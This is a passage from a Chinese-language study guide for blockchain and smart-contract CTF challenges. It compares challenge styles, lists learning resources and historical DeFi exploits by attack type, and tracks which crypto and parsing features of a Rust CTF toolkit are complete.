| 核心技能 | Solidity 漏洞利用 | 交易解码 + 数据提取 |
| 环境 | 测试网（Sepolia） | Goerli（历史归档） |
| flag 位置 | 合约变量中 | 链上数据/外部资源中 |
| 是否需要写合约 | 通常需要 | 通常不需要 |
| 时间 | 每关 30min–2h | 每题 2–4h |

---

## 推荐资源汇总

### 必读书/文档

| 资源 | 类型 | 说明 |
|---|---|---|
| Ethereum.org | 官方文档 | 基础概念 |
| Solidity Docs | 语言文档 | 完整语法 + 安全考量 |
| Ethernaut | CTF 平台 | 30+ 关，从入门到进阶 |
| Damn Vulnerable DeFi | CTF 平台 | 12 个 DeFi 安全场景 |
| Flashbots Docs | MEV | MEV 核心概念 |
| OpenZeppelin Docs | 安全库 | 标准合约实现 |

### YouTube / 博客

| 资源 | 内容 |
|---|---|
| Smart Contract Programmer | Solidity 教程系列 |
| Patrick Collins | 全栈 Web3 开发（含安全） |
| OpenZeppelin Blog | 安全最佳实践 |
| Rekt News | 链上攻击事件分析 |

### 安全事件研究

| 事件 | 损失 | 攻击类型 |
|---|---|---|
| The DAO (2016) | $60M | 重入 |
| Parity Wallet (2017) | $150M | delegatecall + 权限 |
| bZx (2020) | $8M | 闪电贷 + 预言机 |
| Euler (2023) | $197M | 捐赠攻击 + 治理 |
| Ronin Bridge (2022) | $624M | 多签私钥泄漏 |

---

## 与本项目工具链的关联

| 学习内容 | 本项目的 Rust 实现 | 状态 |
|---|---|---|
| Keccak-256 | ctf-crypto::ecc::keccak256 | ✅ 完成 |
| secp256k1 点运算 | ctf-crypto::ecc::secp256k1_pubkey | ✅ 完成 |
| 以太坊地址推导 | ctf-crypto::ecc::eth_address | ✅ 完成 |
| 华为杯真题验证 | eth_address("秘密吗?藏在Goerli网络里.") | ✅ 0x34c5a8cb…E186 |
| Coppersmith 小根 | ctf-crypto::lattice::small_roots | ✅ 完成 |
| LCG 预测 | ctf-crypto::lcg | ✅ 完成 |
| MD4/NTLMv2 | ctf-crypto::ntlm | ✅ 完成 |
| pcap/DNS 解析 | ctf-parse::pcap + netproto | ✅ 完成 |
| apbq 正交格 | Python oracle (work/y2024q/) | ⏳ Rust 移植待做 |
| EVM 存储读取 | cast storage / web3.py | 外部工具 |
